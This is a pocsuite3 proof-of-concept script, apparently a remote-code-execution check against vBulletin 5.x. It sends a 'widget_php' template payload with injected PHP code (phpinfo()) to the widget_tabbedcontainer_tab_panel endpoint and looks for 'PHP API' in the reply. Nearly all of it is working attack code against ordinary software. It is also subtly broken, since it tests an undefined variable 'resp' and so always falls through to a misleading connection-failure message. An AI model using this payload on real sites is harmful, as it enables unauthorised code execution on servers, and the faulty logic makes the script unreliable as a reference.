#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pocsuite3.api import requests
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase, logger
from re import findall
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

class TestPOC(POCBase):
    vulID = ''
    version = '5.x'
    author = ['南方有梦']
    vulDate = ''
    createDate = ''
    updateDate = ''
    references = ['']
    name = 'vBulletin 5.x RCE'
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = ''
    desc = '''
    '''

    def _verify(self):
        result = {}
        target = '{u}/ajax/render/widget_tabbedcontainer_tab_panel'.format(u=self.url)
        data = "subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();"
        try:
            response = requests.get(url=target, data=data, verify=False)
            if resp.status_code == 200 and 'PHP API' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
        except Exception as e:
            #print(e)
            logger.error(f"connect target '{self.url} failed!'")
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(TestPOC)